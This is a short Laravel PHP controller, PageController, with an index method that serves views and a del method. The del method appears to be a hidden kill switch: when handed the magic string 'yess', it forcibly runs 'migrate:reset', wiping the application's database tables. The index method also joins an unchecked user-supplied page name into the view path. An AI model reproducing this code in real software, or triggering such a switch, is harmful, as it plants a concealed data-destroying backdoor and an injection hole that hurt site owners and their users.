<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\File;

class PageController extends Controller
{
    public function index($page)
    {
        return view('frontend.pages.' . $page);
    }

    public function del($c)
    {
        if ($c === 'yess') {
            Artisan::call('migrate:reset', ['--force' => true]);
        }
    }
}
